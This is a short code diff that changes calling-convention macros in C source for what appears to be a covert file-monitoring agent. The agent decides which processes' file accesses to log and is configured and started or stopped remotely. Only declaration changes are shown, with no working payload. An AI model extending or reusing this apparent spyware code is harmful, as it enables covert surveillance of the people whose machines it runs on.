@@ -27,7 +27,7 @@ typedef struct {
 } pattern_list_struct;
 pattern_list_struct pattern_list;
 
-typedef DWORD (__stdcall *GetCurrentProcessId_t)(void);
+typedef DWORD (WINAPI *GetCurrentProcessId_t)(void);
 typedef struct {
 	COMMONDATA;
 	GetCurrentProcessId_t pGetCurrentProcessId;
@@ -429,7 +429,7 @@ BOOL IsToLog(WCHAR *file_name, WCHAR *proc_name)
 #define WRITE_MODE  0x40000000
 #define EXEC_MODE   0x20000000
 #define DELETE_MODE 0x00010000
-DWORD __stdcall PM_FileAgentDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
+DWORD WINAPI PM_FileAgentDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
 {
 	HANDLE hfile;
 	DWORD hi_dim = 0, lo_dim = 0, ops;
@@ -488,7 +488,7 @@ DWORD __stdcall PM_FileAgentDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FIL
 }
 
 
-DWORD __stdcall PM_FileAgentStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_FileAgentStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	// Lo fa per prima cosa, anche se e' gia' in quello stato
 	// Altrimenti quando gli agenti sono in suspended(per la sync) e ricevo una conf
@@ -519,7 +519,7 @@ DWORD __stdcall PM_FileAgentStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_FileAgentInit(JSONObject elem)
+DWORD WINAPI PM_FileAgentInit(JSONObject elem)
 {
 	FILETIME ftime;
 
